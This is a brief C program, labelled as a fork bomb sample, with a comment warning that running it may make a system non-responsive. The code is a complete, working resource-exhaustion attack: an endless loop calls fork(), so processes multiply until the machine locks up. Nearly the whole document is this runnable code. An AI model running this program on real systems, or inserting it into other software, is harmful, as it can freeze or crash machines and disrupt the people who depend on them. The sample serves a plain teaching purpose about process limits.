// C program Sample for FORK BOMB
// It is not recommended to run the program as
// it may make a system non-responsive.
#include<stdio.h>
#include <sys/types.h>
int main()
{
    int i = 1;
	while(i) {
    	fork(); 
        printf("Forked %d\n",i);
        i++;
    } 
	return 0;
}
